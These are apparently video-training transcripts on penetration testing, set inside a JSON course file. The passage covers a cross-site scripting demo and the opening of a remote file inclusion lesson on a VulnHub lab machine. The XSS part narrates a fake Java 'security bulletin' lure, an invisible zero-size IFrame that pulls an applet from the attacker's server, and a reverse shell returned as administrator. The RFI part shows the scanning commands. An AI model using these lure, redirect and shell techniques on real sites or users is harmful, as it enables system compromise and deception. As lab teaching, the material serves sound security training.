00:35:18.790\nit's horrible [LAUGH].\n\n706\n00:35:18.790 --> 00:35:20.580\nI would get black boxed so fast.\n\n707\n00:35:20.580 --> 00:35:25.740\nSo that's my attack, I've put it there,\nnow we're gonna do that browser\n\n708\n00:35:25.740 --> 00:35:32.520\nredirection to get their client machine\nto download this file from my web server.\n\n709\n00:35:32.520 --> 00:35:37.650\nSo make sure your web server is installed\nand running, you've put your attack into\n\n710\n00:35:37.650 --> 00:35:41.760\nthe web root, so that we can do browser\nredirection, have them download that file.\n\n711\n00:35:41.760 --> 00:35:47.440\nAll right, so now that that's there,\nverify that my Apache is running.\n\n712\n00:35:47.440 --> 00:35:52.170\nI can do my little script here\nthat I keep, S-R-V-C-S-H,\n\n713\n00:35:52.170 --> 00:35:54.330\nI'm just gonna hit start.\n\n714\n00:35:54.330 --> 00:35:55.110\nMake sure that's going.\n\n715\n00:35:55.110 --> 00:35:55.890\nYep, there we go.\n\n716\n00:35:57.070 --> 00:35:59.130\nI think I'm all set up,\nI'm ready to fire off.\n\n717\n00:36:00.320 --> 00:36:03.730\nSo what I need to do is I need to do\nmy cross-site scripting attack for\n\n718\n00:36:03.730 --> 00:36:06.130\nthe browser redirect, so\nthat they'll download my code.\n\n719\n00:36:06.130 --> 00:36:09.010\nLet's open up my IceWeasel.\n\n720\n00:36:09.010 --> 00:36:14.790\nWe will go to the Home,\nwe will Comments, go here,\n\n721\n00:36:14.790 --> 00:36:17.620\nand we're just gonna add a couple,\na nice little comment here.\n\n722\n00:36:17.620 --> 00:36:18.120\nIt's gonna be an IFrame.\n\n723\n00:36:20.429 --> 00:36:21.610\nLike that.\n\n724\n00:36:21.610 --> 00:36:24.090\nActually, I don't wanna fat finger it.\n\n725\n00:36:24.090 --> 00:36:25.330\nI was smart.\n\n726\n00:36:25.330 --> 00:36:28.450\nI did browser redirect.\n\n727\n00:36:29.510 --> 00:36:32.500\nSo I'm going to,\nactually you know what I'm gonna do?\n\n728\n00:36:32.500 --> 00:36:34.040\nI'm gonna do it this way.\n\n729\n00:36:34.040 --> 00:36:35.670\nI decided to be a little more sneaky.\n\n730\n00:36:35.670 --> 00:36:39.280\nLet's go to the Admin section,\nlet's create a new post.\n\n731\n00:36:39.280 --> 00:36:40.066\nThis is gonna be fun.\n\n732\n00:36:45.133 --> 00:36:48.055\nTent security bulletin.\n\n733\n00:36:48.055 --> 00:36:50.943\nI see that, bulletin.\n\n734\n00:36:50.943 --> 00:36:54.430\nAnd I'm going to copy and paste.\n\n735\n00:36:54.430 --> 00:36:56.954\nI created this cuz I\nthought it would be funny.\n\n736\n00:36:56.954 --> 00:37:00.481\nCat browser redirect.\n\n737\n00:37:00.481 --> 00:37:01.266\nNope.\n\n738\n00:37:01.266 --> 00:37:05.770\nCat Fake post, there we go.\n\n739\n00:37:06.800 --> 00:37:09.510\nIt says there has been a major exploit\ndiscovered for users running Java,\n\n740\n00:37:09.510 --> 00:37:12.800\nthis post will actually test your\nbrowser for the vulnerability and\n\n741\n00:37:12.800 --> 00:37:15.370\nprompt you to install the fix if it\ndiscovers that you're vulnerable.\n\n742\n00:37:15.370 --> 00:37:18.600\nIt is imperative that you allow\nthis fix to be installed or\n\n743\n00:37:18.600 --> 00:37:20.770\nyou run the risk of having\nyour system compromised.\n\n744\n00:37:20.770 --> 00:37:24.400\nSince we are providing the fix ourselves\nJava might give you a security warning,\n\n745\n00:37:24.400 --> 00:37:28.240\nmake sure to check the I Accept This Risk\nbox and then click Run.\n\n746\n00:37:28.240 --> 00:37:30.260\nEverything else will be\nupdated in the background.\n\n747\n00:37:30.260 --> 00:37:36.260\nSincerely the My Blog tech support,\nthank you for your cooperation, right.\n\n748\n00:37:36.260 --> 00:37:38.970\nSo I'm just gonna copy and\npaste that as my post.\n\n749\n00:37:38.970 --> 00:37:40.180\n&gt;&gt; Social engineering at its finest.\n\n750\n00:37:40.180 --> 00:37:44.250\n&gt;&gt; Social engineering And\nPaste that, there we go.\n\n751\n00:37:44.250 --> 00:37:48.200\nNow I'm gonna add that as an actual,\nso if I go to the home page,\n\n752\n00:37:48.200 --> 00:37:51.080\nif I'm a user I go to the home page,\nI'm gonna see, wow, man.\n\n753\n00:37:52.480 --> 00:37:54.380\nI gotta check this out,\nI gotta look at that.\n\n754\n00:37:54.380 --> 00:37:57.080\nSo I'm gonna also add my comment here,\n\n755\n00:37:57.080 --> 00:38:03.100\nwhich is gonna be my browser redirect, my\ngood old IFrame, I'm gonna also copy that.\n\n756\n00:38:03.100 --> 00:38:07.398\nSo cat browser redirect, I've been wanting\nto do this the whole time, haven't I?\n\n757\n00:38:07.398 --> 00:38:10.030\nSo I've got a couple of them\nhere just really quickly.\n\n758\n00:38:10.030 --> 00:38:15.653\nI can create an IFrame,\njust a regular IFrame for this Java HTML.\n\n759\n00:38:15.653 --> 00:38:17.989\nI can do this with height and\n\n760\n00:38:17.989 --> 00:38:23.186\nwidth to make it basically invisible,\nsaying zero, zero.\n\n761\n00:38:23.186 --> 00:38:28.880\nHeight and width is zero, so it will make\na weird square and we don't wanna do that.\n\n762\n00:38:28.880 --> 00:38:32.940\nWe want it to run this attack here.\n\n763\n00:38:32.940 --> 00:38:34.150\nActually, it was Java.\n\n764\n00:38:34.150 --> 00:38:36.270\nI'm doing the Java attack,\nnot the IE 8 attack.\n\n765\n00:38:36.270 --> 00:38:37.840\nI was playing with that earlier.\n\n766\n00:38:37.840 --> 00:38:38.660\nSo I was firing up.\n\n767\n00:38:38.660 --> 00:38:41.420\nSo we're gonna do this Java attack and\nI'll use this invisible one.\n\n768\n00:38:41.420 --> 00:38:48.350\nSo you can see what that looks like,\ncuz my code is Java, not HTML, copy that.\n\n769\n00:38:48.350 --> 00:38:49.250\nPaste that in here.\n\n770\n00:38:49.250 --> 00:38:52.540\nI don't know why this thing does that.\n\n771\n00:38:52.540 --> 00:38:53.420\nIt's weird.\n\n772\n00:38:54.600 --> 00:38:56.970\nAll right, let's see here, looks all good.\n\n773\n00:38:56.970 --> 00:39:00.756\nThe source IFrame source is from\nmy web server grabbing Java HTML,\n\n774\n00:39:00.756 --> 00:39:04.080\nthe height zero, width zero,\nand then close the IFrame.\n\n775\n00:39:04.080 --> 00:39:05.150\nAll right, looks good.\n\n776\n00:39:05.150 --> 00:39:06.740\nSubmit the query.\n\n777\n00:39:06.740 --> 00:39:09.170\nAnd now, here I am at work.\n\n778\n00:39:09.170 --> 00:39:10.850\nI'm random user.\n\n779\n00:39:10.850 --> 00:39:13.160\nMy listener's fired up I do believe.\n\n780\n00:39:13.160 --> 00:39:16.430\nIf I can get to that.\n\n781\n00:39:16.430 --> 00:39:17.750\nYep, listener's waiting.\n\n782\n00:39:17.750 --> 00:39:19.900\nLooks all good.\nI'm gonna go home.\n\n783\n00:39:19.900 --> 00:39:22.990\nLooking through the blog posts.\n\n784\n00:39:22.990 --> 00:39:23.490\nWhat's this?\n\n785\n00:39:23.490 --> 00:39:24.610\nSecurity Bulletin.\n\n786\n00:39:24.610 --> 00:39:25.132\nYeah, let's check that out.\n\n787\n00:39:27.963 --> 00:39:28.680\nWhat's going on here?\n\n788\n00:39:29.720 --> 00:39:31.940\nHm.\nThere's been a major exploit discovered.\n\n789\n00:39:31.940 --> 00:39:32.620\nYeah, what's this?\n\n790\n00:39:32.620 --> 00:39:34.410\nSecurity warning?\n\n791\n00:39:34.410 --> 00:39:35.580\nIt says I should accept.\n\n792\n00:39:35.580 --> 00:39:37.370\nOkay I click to accept this risk.\n\n793\n00:39:37.370 --> 00:39:39.190\nYeah I totally don't wanna be compromised.\n\n794\n00:39:39.190 --> 00:39:39.800\nHit Run.\n\n795\n00:39:40.930 --> 00:39:44.030\nNow look at my listener right down here.\n\n796\n00:39:44.030 --> 00:39:45.230\nI have now, who am I?\n\n797\n00:39:45.230 --> 00:39:48.840\nI'm running as administrator.\n\n798\n00:39:48.840 --> 00:39:51.100\nSo that person ran their job,\n\n799\n00:39:51.100 --> 00:39:54.710\na little social engineering involved\nthere, but once they clicked okay and\n\n800\n00:39:54.710 --> 00:39:59.060\nthey ran that applet It basically shoveled\na shell back to me waiting for that and\n\n801\n00:39:59.060 --> 00:40:00.670\nif you look it down-\n&gt;&gt; Can you go back to the Windows box?\n\n802\n00:40:00.670 --> 00:40:02.000\n&gt;&gt; Yeah, none the wiser right.\n\n803\n00:40:02.000 --> 00:40:07.120\nNothing is going crazy here,\nthey're like weird, they can post and\n\n804\n00:40:07.120 --> 00:40:11.240\nsay just user one, wow, thanks,\n\n805\n00:40:11.240 --> 00:40:16.180\nyou know this is great, thanks so\n\n806\n00:40:16.180 --> 00:40:20.460\nmuch, what I really wanna put,\nsubmit that, it will go in.\n\n807\n00:40:20.460 --> 00:40:22.219\nThe WAN's just fine, it's working.\n\n808\n00:40:22.219 --> 00:40:25.230\nI'm still over here in complete control.\n\n809\n00:40:25.230 --> 00:40:27.780\nThey have no idea,\neverything is working just fine.\n\n810\n00:40:27.780 --> 00:40:31.530\nSo that's a very dangerous type of attack\nand now you've seen why I'm able to\n\n811\n00:40:31.530 --> 00:40:35.910\ncompletely compromise a system, using\nbrowser redirects, cross-site scripting\n\n812\n00:40:35.910 --> 00:40:39.380\nand then my client side, I created\na Java app, could be an HTML app.\n\n813\n00:40:39.380 --> 00:40:41.940\nWhatever.\nYou find the source code that exploits\n\n814\n00:40:41.940 --> 00:40:45.360\nwhatever browser that they're running,\nand go to town.\n\n815\n00:40:45.360 --> 00:40:47.910\n&gt;&gt; All right,\nfantastic stuff there, Daniel.\n\n816\n00:40:47.910 --> 00:40:51.570\nGreat demonstration of\ncross-site scripting.\n\n817\n00:40:51.570 --> 00:40:54.050\nProbably one of the best demonstrations\nI think I've seen in a long time,\n\n818\n00:40:54.050 --> 00:40:55.780\nyou really made it very clear.\n\n819\n00:40:55.780 --> 00:40:58.960\nSo hopefully now you guys out there\nunderstand what it is when people talk\n\n820\n00:40:58.960 --> 00:41:03.950\nabout cross-site scripting and how danger\nit is, dangerous if i can say that.\n\n821\n00:41:03.950 --> 00:41:06.500\nHow dangerous it is,\nbecause it's like a drive by, right?\n\n822\n00:41:06.500 --> 00:41:09.040\nYou just visited a webpage and\nyou got infected.\n\n823\n00:41:09.040 --> 00:41:12.070\nYou didn't have to do anything,\nyou didn't have to click on anything.\n\n824\n00:41:12.070 --> 00:41:14.210\nIt was just your browser\ninterpreting that page.\n\n825\n00:41:14.210 --> 00:41:15.158\nDangerous stuff.\n\n826\n00:41:15.158 --> 00:41:18.180\nAs a pen tester, we've got to know\nhow to check for those things.\n\n827\n00:41:18.180 --> 00:41:20.007\nSo Daniel showed you that as well,\n\n828\n00:41:20.007 --> 00:41:23.978\nhow to determine if our site is\nvulnerable to this cross-site scripting.\n\n829\n00:41:23.978 --> 00:41:25.170\nSo we do appreciate that.\n\n830\n00:41:25.170 --> 00:41:28.460\nWe hope everybody out there\nenjoyed watching this one.\n\n831\n00:41:28.460 --> 00:41:31.270\nSigning off for ITProTV,\nI have been your host Mike Rodrick.\n\n832\n00:41:31.270 --> 00:41:32.090\n&gt;&gt; And I'm Daniel Lowrie.\n\n833\n00:41:32.090 --> 00:41:32.856\n&gt;&gt; And we'll see you next time.\n\n834\n00:41:32.856 --> 00:41:40.105\n[MUSIC]\n\n835\n00:41:40.105 --> 00:41:42.650\n&gt;&gt; Thank you for watching IT Pro TV.\n\n",
          "vimeoId": "202378819"
        },
        {
          "description": "In this episode, Dan and Mike look at remote file inclusion. They demonstrate how to determine if a site is vulnerable to RFI. Then they use RFI to obtain a reverse shell on a target machine.",
          "length": "1967",
          "thumbnail": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-5-2-web_apps_remote_file_inclusion-020117-PGM.00_32_57_19.Still001.png",
          "thumbnailMed": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-5-2-web_apps_remote_file_inclusion-020117-PGM.00_32_57_19.Still001-med.jpg",
          "thumbnailSm": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-5-2-web_apps_remote_file_inclusion-020117-PGM.00_32_57_19.Still001-sm.jpg",
          "title": "Web Apps Remote File Inclusion (RFI)",
          "transcript": "WEBVTT\n\n1\n00:00:00.270 --> 00:00:05.583\nWelcome to ITProTV, I'm your host, Don-\n&gt;&gt; [CROSSTALK]\n\n2\n00:00:05.583 --> 00:00:08.564\n[MUSIC]\n\n3\n00:00:08.564 --> 00:00:11.996\n&gt;&gt; You're watching ITProTV.\n\n4\n00:00:11.996 --> 00:00:15.485\n&gt;&gt; Hello, welcome to another\nexciting episode here at ITProTV.\n\n5\n00:00:15.485 --> 00:00:17.510\nI'm your host, Mike Rodrick.\n\n6\n00:00:17.510 --> 00:00:20.100\nAnd today we're doing\nour penetration testing.\n\n7\n00:00:20.100 --> 00:00:23.896\nIn this episode, we're gonna be looking\nat another type of web-based attack, or\n\n8\n00:00:23.896 --> 00:00:24.666\nweb app attack.\n\n9\n00:00:24.666 --> 00:00:30.040\nAnd that's known as RFI,\nor remote file inclusion.\n\n10\n00:00:30.040 --> 00:00:33.280\nAnd here to share his\nknowledge on the topic, so\n\n11\n00:00:33.280 --> 00:00:36.730\nthat we can be as knowledgeable,\nis Mr. Daniel Lowrie.\n\n12\n00:00:36.730 --> 00:00:37.722\nWelcome back, Daniel.\n\n13\n00:00:37.722 --> 00:00:38.805\n&gt;&gt; Mike, so glad to be back, man.\n\n14\n00:00:38.805 --> 00:00:42.321\nWe're cranking out this pen testing\nstuff and it's been so much fun so far.\n\n15\n00:00:42.321 --> 00:00:46.022\nAnd today we've landed on the topic\nof remote file inclusion.\n\n16\n00:00:46.022 --> 00:00:51.960\nIt's one of my favorites because this is\na nasty little bugger and it's so easy.\n\n17\n00:00:51.960 --> 00:00:56.430\nIf it's vulnerable to this, man,\nthese hacks, they can be so, so easy.\n\n18\n00:00:56.430 --> 00:00:59.166\nI say that, and of course,\nyou'll be pulling your hair out and-\n\n19\n00:00:59.166 --> 00:01:00.033\n&gt;&gt; [LAUGH]\n\n20\n00:01:00.033 --> 00:01:00.628\n&gt;&gt; Frustrated and\n\n21\n00:01:00.628 --> 00:01:03.057\nshaking your fist at me, going,\nthat Lowrie said it was easy!\n\n22\n00:01:03.057 --> 00:01:07.000\n&gt;&gt; The 50th time you done it, it's easy.\n\n23\n00:01:07.000 --> 00:01:08.527\n&gt;&gt; You just crank it out after that,\nright?\n\n24\n00:01:08.527 --> 00:01:09.619\n&gt;&gt; [LAUGH]\n&gt;&gt; Yeah, that's right,\n\n25\n00:01:09.619 --> 00:01:12.180\nso you definitely wanna practice\nthese things as you can.\n\n26\n00:01:12.180 --> 00:01:15.700\nSpeaking of being able to practice,\nfor this demonstration,\n\n27\n00:01:15.700 --> 00:01:19.300\nI have gone back to our good\nfriends at VulnHub.com and\n\n28\n00:01:19.300 --> 00:01:23.680\ndownloaded another VM for\nthis specific type of attack.\n\n29\n00:01:23.680 --> 00:01:27.770\nThis VM is called Milnets,\nif I'm not mistaken, yes, Milnet 1.0.\n\n30\n00:01:27.770 --> 00:01:30.689\nI'll show you what it looks like\nfired up on my screen here.\n\n31\n00:01:30.689 --> 00:01:34.215\nThere you go, so beautiful with\nthe ASCII art, I do love it so.\n\n32\n00:01:34.215 --> 00:01:37.328\nI just fired that up,\nput that in a virtual sandbox.\n\n33\n00:01:37.328 --> 00:01:40.112\nDon't allow people to access\nit from the Internet,\n\n34\n00:01:40.112 --> 00:01:44.286\nbecause It is vulnerable by design, so\nthat you can learn these techniques and\n\n35\n00:01:44.286 --> 00:01:46.650\nconcepts and have a good time as well.\n\n36\n00:01:46.650 --> 00:01:49.147\nSo thanks, guys over at VulnHub,\nappreciate that for\n\n37\n00:01:49.147 --> 00:01:50.353\nus being able to use this.\n\n38\n00:01:50.353 --> 00:01:56.260\nAnd this guy's gonna allow us,\nit is vulnerable to a RFI type of attack.\n\n39\n00:01:56.260 --> 00:02:00.570\nSo that being said, I'll go ahead and take\nmy screen away, let's talk for a moment.\n\n40\n00:02:00.570 --> 00:02:01.949\nLet's gather around the campfire.\n\n41\n00:02:01.949 --> 00:02:06.370\nWhat the heck are we talking about when\nwe say RFI or remote file inclusion?\n\n42\n00:02:07.620 --> 00:02:12.835\nSo what we mean is, we are going\nto include a file that is remote.\n\n43\n00:02:12.835 --> 00:02:16.196\n[LAUGH] Yeah, you're like,\nokay, smarty, I get it.\n\n44\n00:02:16.196 --> 00:02:20.001\n&gt;&gt; [LAUGH]\n&gt;&gt; What we mean is that I'm gonna have\n\n45\n00:02:20.001 --> 00:02:24.432\na file on my system, or\na remote system to the target,\n\n46\n00:02:24.432 --> 00:02:30.360\nthat I want to include as part of the URL,\nbasically, or the web app.\n\n47\n00:02:30.360 --> 00:02:33.468\nSo, when I run something on a target,\n\n48\n00:02:33.468 --> 00:02:37.851\na web app,\nit's gonna include a file from my system.\n\n49\n00:02:37.851 --> 00:02:40.089\nThat's the basic gist of it.\n\n50\n00:02:40.089 --> 00:02:41.870\nAnd what do you mean?\n\n51\n00:02:41.870 --> 00:02:43.821\nHow do you conclude?\n\n52\n00:02:43.821 --> 00:02:46.851\nWell, sometimes when people\ncreate websites, they say, man,\n\n53\n00:02:46.851 --> 00:02:50.140\nI don't wanna download all\nthese files from Getty Images.\n\n54\n00:02:50.140 --> 00:02:53.330\nI want to just go to Getty Images and\nget them.\n\n55\n00:02:53.330 --> 00:02:56.805\nSo I'll include that,\nI'll turn on some flags in my PHP code, so\n\n56\n00:02:56.805 --> 00:02:59.791\nthat I can include those files\nfrom the remote servers.\n\n57\n00:02:59.791 --> 00:03:04.120\nSeems like it's a very important or\na good thing to do, right?\n\n58\n00:03:04.120 --> 00:03:04.711\n&gt;&gt; Absolutely.\n\n59\n00:03:04.711 --> 00:03:07.658\n&gt;&gt; So you're not storing all the images\nthat you need, Getty Images is doing it,\n\n60\n00:03:07.658 --> 00:03:09.861\nor wherever that you're getting\nthem from is doing that.\n\n61\n00:03:09.861 --> 00:03:12.532\nSo this is one of the reasons\nthat you might wanna do this,\n\n62\n00:03:12.532 --> 00:03:13.932\nyou might wanna turn this on.\n\n63\n00:03:13.932 --> 00:03:20.558\nUnfortunately, it opens you up, if you are\nnot doing proper sanitization of URLs and\n\n64\n00:03:20.558 --> 00:03:24.974\nthings of that nature,\nthen the problem lies in, well,\n\n65\n00:03:24.974 --> 00:03:29.590\nI can just take that Getty Images URL\nout and add my URL to it.\n\n66\n00:03:29.590 --> 00:03:30.959\nAnd now it'll look to me,\n\n67\n00:03:30.959 --> 00:03:35.960\nbecause it's looking for a URL that's\nremote to itself, and to include a file.\n\n68\n00:03:35.960 --> 00:03:39.740\nThis is the danger of working\nwith remote file inclusions.\n\n69\n00:03:39.740 --> 00:03:44.240\nSo, if you turn these things on, that will\nbe in your phpinfo file, in the setup,\n\n70\n00:03:44.240 --> 00:03:45.692\nin the .conf, all that.\n\n71\n00:03:45.692 --> 00:03:48.127\nThere will be a couple of flags,\n\n72\n00:03:48.127 --> 00:03:52.932\nI wrote them down because I wanted\nto make sure I got them right.\n\n73\n00:03:52.932 --> 00:03:57.279\nAllow_url_fopen = on.\n\n74\n00:03:57.279 --> 00:03:59.076\nAnd let me go to my computer real quick,\nI'll type it out so\n\n75\n00:03:59.076 --> 00:04:00.890\nyou can kinda get a visual of it.\n\n76\n00:04:00.890 --> 00:04:03.133\nLet me do this,\nmake these a little bigger here.\n\n77\n00:04:03.133 --> 00:04:08.925\nSo it'll look like this, allow urI,\n\n78\n00:04:08.925 --> 00:04:13.820\nI think it's _url, _url_.\n\n79\n00:04:13.820 --> 00:04:16.688\nI'm sorry, allow_url [LAUGH].\n\n80\n00:04:16.688 --> 00:04:19.135\nI am the world's worst typist,\nas you can tell.\n\n81\n00:04:19.135 --> 00:04:20.583\nRonnie taught me well, man.\n\n82\n00:04:20.583 --> 00:04:21.824\n&gt;&gt; You still haven't got it, sorry.\n\n83\n00:04:21.824 --> 00:04:23.022\n&gt;&gt; You be quiet over there!\n\n84\n00:04:23.022 --> 00:04:23.768\n&gt;&gt; It says usl.\n\n85\n00:04:23.768 --> 00:04:24.805\n&gt;&gt; [LAUGH] Does it really?\n\n86\n00:04:24.805 --> 00:04:25.885\n&gt;&gt; [LAUGH] Yes.\n\n87\n00:04:25.885 --> 00:04:28.627\n&gt;&gt; Jeez, url, there we go.\n\n88\n00:04:28.627 --> 00:04:31.220\nThat's what it should look like.\n\n89\n00:04:31.220 --> 00:04:31.990\nYou've got this one, so\n\n90\n00:04:31.990 --> 00:04:37.490\nif you see if that in your php.conf and it\nequals on, you might wanna make that off.\n\n91\n00:04:37.490 --> 00:04:43.390\nAlso, as well, it'll look like this,\nallow_url_include = on.\n\n92\n00:04:43.390 --> 00:04:45.700\nSo you're allowing includes.\n\n93\n00:04:45.700 --> 00:04:48.340\nSo if you've played around\nwith any HTML and PHP,\n\n94\n00:04:48.340 --> 00:04:51.490\nyou have these lovely\nthings called includes.\n\n95\n00:04:51.490 --> 00:04:54.170\nWe're including files from other places,\nand\n\n96\n00:04:54.170 --> 00:04:57.340\nyou're giving it information\nfrom using that include.\n\n97\n00:04:57.340 --> 00:05:00.311\nThis is where the danger can lie,\nand this also can also lead to us\n\n98\n00:05:00.311 --> 00:05:04.350\nhaving problems with local file inclusion\nthat we'll talk about in a different show.\n\n99\n00:05:04.350 --> 00:05:07.782\nCuz this is going to take up the entirety\nof this one, that is for sure.\n\n100\n00:05:07.782 --> 00:05:09.806\nSo let's get back to\nremote file inclusion.\n\n101\n00:05:09.806 --> 00:05:12.540\nLet's see here, what else do I\nneed you guys to know about that?\n\n102\n00:05:12.540 --> 00:05:14.314\nHow do I find out whether or\n\n103\n00:05:14.314 --> 00:05:18.600\nnot this site is vulnerable,\nor that a site is vulnerable?\n\n104\n00:05:18.600 --> 00:05:21.982\nWell of course, as we do, as pen testers,\nwhat are the first phases?\n\n105\n00:05:21.982 --> 00:05:24.599\nScanning and enumeration,\nwe've gotta run that gambit.\n\n106\n00:05:24.599 --> 00:05:26.673\nGotta do it, it's part of our job.\n\n107\n00:05:26.673 --> 00:05:28.677\nSo we run Nmap, we run Nikto,\n\n108\n00:05:28.677 --> 00:05:32.220\nbecause those are two very good things for\nrunning.\n\n109\n00:05:32.220 --> 00:05:35.368\nWe can also run some other scanners,\nbut for this intents and purposes,\n\n110\n00:05:35.368 --> 00:05:37.342\nthat's all we'll need, so let's do this.\n\n111\n00:05:37.342 --> 00:05:39.622\nWe're gonna Nmap scan really quickly.\n\n112\n00:05:39.622 --> 00:05:43.113\nNmap, actually, we gotta find the IP\naddress of our vulnerable machine.\n\n113\n00:05:43.113 --> 00:05:44.473\nSo I'll do that whole netdiscover.\n\n114\n00:05:47.406 --> 00:05:50.804\n-i eth0 -r for the range.\n\n115\n00:05:50.804 --> 00:05:56.126\nAnd 192.168.209.1/24.\n\n116\n00:05:56.126 --> 00:05:58.687\nFire off, let's see if we can't\nfind ourselves some IP addresses.\n\n117\n00:05:58.687 --> 00:06:01.761\nThere we go, looking good.\n\n118\n00:06:01.761 --> 00:06:04.862\n156 looks to be our target machine.\n\n119\n00:06:04.862 --> 00:06:09.241\nCuz I know 1 is me, and so is 254,\nbecause that's the gateway.\n\n120\n00:06:09.241 --> 00:06:12.337\nCtrl+C that,\nnow we know what our machine is.\n\n121\n00:06:12.337 --> 00:06:20.077\nRun our trusty nmap -a for that lovely\nall-in-one package that Nmap affords us.\n\n122\n00:06:20.077 --> 00:06:27.310\nGive it some aggressive timing, all ports,\nand then the IP address 192.168.209.156.\n\n123\n00:06:27.310 --> 00:06:33.098\nHit Return, let that crank off.\n\n124\n00:06:33.098 --> 00:06:36.768\nWhile that's happening,\nI'll also fire off a Nitko scan.\n\n125\n00:06:36.768 --> 00:06:41.466\nNikto [LAUGH], man, I'm having\ntrouble with the whole words and\n\n126\n00:06:41.466 --> 00:06:44.980\nthe letter thing, putting them together.\n\n127\n00:06:44.980 --> 00:06:46.384\nMan, that's a real pain in the bum.\n\n128\n00:06:46.384 --> 00:06:53.531\nThere we go, -h for host,\n192.168.219.156, fire off Nikto.\n\n129\n00:06:53.531 --> 00:06:56.688\nSo one of these guys'll\nget done before the other.\n\n130\n00:06:56.688 --> 00:06:59.348\nAnd there we go,\nboth almost the exact same time here.\n\n131\n00:06:59.348 --> 00:07:04.134\nSo, we see in our Nmap scan,\nwe're doing our scanning here,\n\n132\n00:07:04.134 --> 00:07:06.630\nport 22 is open to SSH access.\n\n133\n00:07:06.630 --> 00:07:10.384\nWe might need that later,\nas we get beyond RFIs and things.\n\n134\n00:07:10.384 --> 00:07:13.282\nWe have, port 80 is open, all right.\n\n135\n00:07:13.282 --> 00:07:18.020\nWeb server is lighttpd 1.4.35.\n\n136\n00:07:18.020 --> 00:07:23.107\nAll great information for us to know\nas we are building up our vision,\n\n137\n00:07:23.107 --> 00:07:27.070\nour image,\nof what this system actually looks like.\n\n138\n00:07:27.070 --> 00:07:29.638\nLet's jump down here into Nikto.\n\n139\n00:07:31.460 --> 00:07:32.781\nLet's see what we find here.\n\n140\n00:07:32.781 --> 00:07:35.270\nGot the server again, lighttpd.\n\n141\n00:07:37.390 --> 00:07:39.465\nWhat else can we glean from this guy?\n\n142\n00:07:39.465 --> 00:07:42.042\nWe got an info.php that we can get to.\n\n143\n00:07:42.042 --> 00:07:42.915\nThe function was found.\n\n144\n00:07:44.815 --> 00:07:46.846\nThat could be good,\ninteresting information.\n\n145\n00:07:46.846 --> 00:07:47.837\nThere's some more stuff.\n\n146\n00:07:49.515 --> 00:07:52.306\nOutput from the phpinfo\nfunction was found, so\n\n147\n00:07:52.306 --> 00:07:55.736\nit did actually fire that off and\nfound some information.\n\n148\n00:07:56.873 --> 00:08:02.418\nAnd then here, info.php RFI\nfrom [INAUDIBLE] or From here.\n\n149\n00:08:02.418 --> 00:08:05.580\nSo it's saying that there might\nbe an RFI vulnerability here.\n\n150\n00:08:05.580 --> 00:08:09.690\nSo I see that in my scan specifically.\n\n151\n00:08:09.690 --> 00:08:11.300\nOkay, I'm gonna keep that\nin the back of my mind.\n\n152\n00:08:11.300 --> 00:08:13.450\nI've probably got a scratch\npiece of paper, or\n\n153\n00:08:13.450 --> 00:08:17.710\nmaybe a file off to the side where\nI'm typing into, saying, here are my\n\n154\n00:08:17.710 --> 00:08:21.960\npossible attack vectors that I've gleaned\nfrom my scanning and my enumeration.\n\n155\n00:08:21.960 --> 00:08:25.880\nSeeing RFI, maybe I've gone through\nsome different attack vectors and\n\n156\n00:08:25.880 --> 00:08:27.290\nI've gotten nowhere.\n\n157\n00:08:27.290 --> 00:08:28.900\nI might wanna jump on that and\n\n158\n00:08:28.900 --> 00:08:34.560\nsee RFI that could be a good way to go,\nI'll put that on my list of things to do.\n\n159\n00:08:34.560 --> 00:08:35.420\nAll right, let's see here.\n\n160\n00:08:35.420 --> 00:08:38.940\nWe've gone through some enumeration might\nalso want to run derbs to see if there's\n\n161\n00:08:38.940 --> 00:08:43.180\nany great directories we don't\nsee right out of the gates.\n\n162\n00:08:43.180 --> 00:08:45.400\nBut let's just start\ntalking about exploitation.\n\n163\n00:08:46.630 --> 00:08:48.920\nSo how do we exploit an RFI attack?\n\n164\n00:08:48.920 --> 00:08:51.120\nAnd that's a really good question.\n\n165\n00:08:51.120 --> 00:08:53.690\nA, there's some great tools out\nthere that will help you do that and\n\n166\n00:08:53.690 --> 00:08:55.240\nwe're gonna play with some of those,\nright?\n\n167\n00:08:55.240 --> 00:08:56.220\nThat's a good thing.\n\n168\n00:08:56.220 --> 00:09:00.250\nTools make our jobs easy and\nthat can be a very good thing,\n\n169\n00:09:00.250 --> 00:09:03.700\nespecially if this Is technically your\njob, it's something you're doing,\n\n170\n00:09:03.700 --> 00:09:06.880\nyou want to make it as efficient and\nstreamlined as possible.\n\n171\n00:09:06.880 --> 00:09:09.950\nSo it's good for us to use tools but\nalso you can do these things the manual\n\n172\n00:09:09.950 --> 00:09:14.180\nhard way, just so you can verify to\nyourself that you know how to do them.\n\n173\n00:09:14.180 --> 00:09:15.650\nAnd that's just always valid.\n\n174\n00:09:16.820 --> 00:09:20.130\nSo a couple things we're gonna talk\nabout when it comes to attacking tools.\n\n175\n00:09:20.130 --> 00:09:21.920\nThings I want you guys to download,\ninstall.\n\n176\n00:09:21.920 --> 00:09:26.300\nSo you definitely grab a cuz you're gonna\nneed it first to be able to practice this.\n\n177\n00:09:26.300 --> 00:09:29.410\nA couple of browser plug ins, right?\n\n178\n00:09:29.410 --> 00:09:32.690\nSome great tools again for Firefox and\nanother one in Firefox, I'm no so\n\n179\n00:09:32.690 --> 00:09:36.302\nsure about Chrome or IE but\ndefinitely run on Firefox.\n\n180\n00:09:36.302 --> 00:09:37.757\nThere's gonna be HackBar.\n\n181\n00:09:37.757 --> 00:09:38.860\nI love Hackbar.\n\n182\n00:09:38.860 --> 00:09:39.880\nMy goodness.\n\n183\n00:09:39.880 --> 00:09:41.590\nHackBar's a fantastic tool.\n\n184\n00:09:41.590 --> 00:09:44.870\nI love the stinking thing,\nwe're gonna use it in this.\n\n185\n00:09:44.870 --> 00:09:51.530\nAlso Tamper Data, which is a great piece\nof software, it's also a Firefox plugin.\n\n186\n00:09:51.530 --> 00:09:55.770\nIf you have Cowley running,\nyou will also have BurpSuite installed.\n\n187\n00:09:55.770 --> 00:10:01.706\nBurpSuite is an all-in-one Web\napp attack platform, fantastic,\n\n188\n00:10:01.706 --> 00:10:07.670\nfully featured suites of tools\nto against Web applications.\n\n189\n00:10:07.670 --> 00:10:11.560\nSo anyone of those guys could get you so\nthe golden ticket.\n\n190\n00:10:11.560 --> 00:10:14.620\nWe're gonna use a couple of them here and\njust show you how to use 